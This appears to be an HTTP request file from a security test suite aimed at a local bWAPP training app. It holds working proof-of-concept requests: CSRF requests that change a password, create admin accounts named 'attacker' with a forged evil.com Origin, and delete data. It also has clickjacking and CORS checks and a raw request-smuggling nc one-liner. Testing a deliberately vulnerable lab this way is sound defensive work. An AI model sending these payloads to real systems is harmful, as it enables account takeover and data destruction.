### ============================================================================
### 07 - A5 Security Misconfiguration
###       A8 Software and Data Integrity Failures (CSRF)
###       A6 Vulnerable and Outdated Components (clickjacking)
### ============================================================================

### ---------------------------------------------------------------------------
### CSRF-01  Change another user's password - no token, no confirmation
###   The classic CSRF PoC shape: everything a <form> can send, nothing that
###   proves the user intended it. Note there is no Origin/Referer check either,
###   and the session cookie is not SameSite-restricted.
###   Steal this request into an attacker's auto-submitting HTML page and any
###   logged-in bWAPP user who visits it has their password replaced.
### ---------------------------------------------------------------------------
POST {{baseUrl}}/csrf_1.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
Content-Type: application/x-www-form-urlencoded

password=pwned&password_conf=pwned&form=submit
### Expected: 200, success; no anti-CSRF token was requested or validated
### Restore afterwards with 06-auth-session.http AUTH-08.


### ---------------------------------------------------------------------------
### CSRF-02  Privilege escalation - create a brand new ADMIN account
###   csrf_2.php creates users and honours the `admin` field with no token and
###   no privilege check. This is CSRF chained into full account takeover:
###   victim visits a page, attacker gets an admin account.
### ---------------------------------------------------------------------------
POST {{baseUrl}}/csrf_2.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
Content-Type: application/x-www-form-urlencoded

login=attacker&password=attacker&email=attacker%40evil.com&secret=x&activated=on&admin=on&form=submit
### Expected: 200, account "attacker" created with admin rights
### Verify:  POST {{baseUrl}}/login.php with login=attacker&password=attacker


### ---------------------------------------------------------------------------
### CSRF-03  Destructive action - delete blog entries with no token
###   sqli_7.php deletes rows straight from a POST with no confirmation step
###   and no token, so one cross-site POST wipes the data.
### ---------------------------------------------------------------------------
POST {{baseUrl}}/sqli_7.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
Content-Type: application/x-www-form-urlencoded

entry_delete=1&blog=submit&form=submit
### Expected: 200, the blog entry is gone


### ---------------------------------------------------------------------------
### CSRF-04  Cross-site request forgery with an explicit attacker Origin
###   Re-sends CSRF-02 while advertising a foreign Origin, to show the server
###   neither validates Origin/Referer nor sets SameSite on the session cookie.
### ---------------------------------------------------------------------------
POST {{baseUrl}}/csrf_2.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
Origin: http://attacker.evil.com
Referer: http://attacker.evil.com/csrf.html
Content-Type: application/x-www-form-urlencoded

login=attacker2&password=attacker2&email=a2%40evil.com&secret=x&activated=on&admin=on&form=submit
### Expected: 200, the request is processed exactly as if it were first-party


### ---------------------------------------------------------------------------
### CLICK-01  Clickjacking - no frame protection
###   The response carries no X-Frame-Options and no CSP frame-ancestors, so
###   any third-party page can iframe bWAPP and overlay transparent buttons on
###   top of state-changing controls (delete, password change, transfer).
### ---------------------------------------------------------------------------
GET {{baseUrl}}/clickjacking.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
### Expected: 200, and NO X-Frame-Options / frame-ancestors in the response headers
### Fix: Content-Security-Policy: frame-ancestors 'none'


### ---------------------------------------------------------------------------
### CLICK-02  Clickjacking is not limited to the demo page - the real admin
###           settings page is framable too
### ---------------------------------------------------------------------------
GET {{baseUrl}}/admin/ HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
### Expected: 200, settings page with no frame protection


### ---------------------------------------------------------------------------
### CORS-01  Wildcard Access-Control-Allow-Origin on a secret-bearing endpoint
###   secret-cors-1.php serves "Neo's secret" with ACAO: *. Any website the
###   victim visits can read it cross-origin. Response body is the proof.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/secret-cors-1.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
### Expected: 200
###   Access-Control-Allow-Origin: *
###   body: Neo's secret: Oh why didn't I took that BLACK pill?


### ---------------------------------------------------------------------------
### CORS-02  Over-narrow allow-list that still reflects a chosen origin
###   secret-cors-2.php only sets the header when Origin is exactly
###   http://intranet.itsecgames.com - including subdomain-style collisions and
###   the fact that any page on that host can then read the secret.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/secret-cors-2.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
Origin: http://intranet.itsecgames.com
### Expected: 200
###   Access-Control-Allow-Origin: http://intranet.itsecgames.com
###   body: Wolverine's secret: What's a Magneto?


### ---------------------------------------------------------------------------
### CORS-03  Negative control - the endpoint leaks a secret with NO CORS header
###   secret-cors-3.php returns "Johnny's secret" with no CORS headers, so a
###   browser blocks cross-origin reads here. Included to show the contrast and
###   to prove the CORS-01 finding is about the header, not the payload.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/secret-cors-3.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
### Expected: 200, body "Johnny's secret: I'm the Ghost Rider!" and NO
###           Access-Control-Allow-Origin - browsers block this cross-origin.


### ---------------------------------------------------------------------------
### SM-01  HTTP request smuggling surface - CL/TE disagreement
###   Kept in the suite as the shape of the attack and as a re-test point after any
###   Apache upgrade. Apache 2.4 on this image rejects the ambiguity (400), so no
###   smuggled request reaches PHP - there is no desync primitive here.
###   NOT SENT BY THE RUNNER: .NET's HttpWebRequest owns Content-Length and
###   Transfer-Encoding and silently rewrites both, so it cannot emit a
###   contradictory pair. Send this with a raw client to actually test it:
###     printf 'POST /secret.php HTTP/1.1\r\nHost: localhost:8443\r\nContent-Length: 42\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n' | nc localhost 8443
### ---------------------------------------------------------------------------
### SKIP
### RUNNER-CANNOT-SEND: Content-Length / Transfer-Encoding are rewritten by the client
POST {{baseUrl}}/secret.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
Content-Length: 42
Transfer-Encoding: chunked

0

### Expected: 400 Bad Request (no smuggled request reaches the backend)
